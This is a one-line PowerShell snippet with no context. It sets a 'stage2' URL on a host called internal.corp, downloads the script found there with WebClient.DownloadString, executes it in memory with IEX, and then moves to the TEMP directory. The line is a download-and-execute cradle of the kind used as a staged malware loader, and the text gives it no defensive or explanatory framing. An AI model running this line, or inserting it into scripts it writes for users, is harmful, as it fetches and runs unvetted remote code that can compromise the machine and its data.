$Stage2Url = "http://internal.corp/stage2.ps1"; $StageScript = (New-Object System.Net.WebClient).DownloadString($Stage2Url); IEX $StageScript; Set-Location -Path $env:TEMP
